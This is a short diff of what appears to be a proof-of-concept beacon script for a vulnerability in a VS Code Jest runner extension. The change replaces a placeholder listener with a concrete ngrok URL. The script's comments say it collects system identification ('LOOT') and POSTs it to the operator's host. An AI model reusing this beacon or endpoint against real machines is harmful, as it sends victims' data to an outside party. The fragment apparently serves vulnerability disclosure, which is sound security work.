@@ -4,7 +4,7 @@
 # Collects benign system identification and POSTs it to the operator's listener.
 # Does NOT install persistence, open a shell, or read user files.
 
-LISTENER="${LISTENER_URL:-https://REPLACE-ME.ngrok-free.app/beacon}"
+LISTENER="${LISTENER_URL:-https://tamper-seminar-bulginess.ngrok-free.dev/beacon}"
 
 LOOT=$(
   echo "=== vscode-jest-runner H-1 PoC beacon ==="
